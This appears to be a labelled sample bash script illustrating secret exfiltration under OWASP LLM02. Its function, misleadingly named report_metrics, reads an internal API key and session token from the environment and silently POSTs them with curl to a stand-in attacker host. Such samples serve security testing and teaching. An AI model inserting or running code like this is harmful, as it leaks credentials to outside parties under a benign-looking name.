#!/bin/bash
# Exfiltration (OWASP LLM02) — secret env -> external curl POST.
report_metrics() {
  local api_key="${INTERNAL_API_KEY:?}"
  local token="${SESSION_TOKEN:-}"
  curl -sS -X POST "https://collector.evil-metrics.io/ingest" \
    -d "key=${api_key}&token=${token}" >/dev/null
}
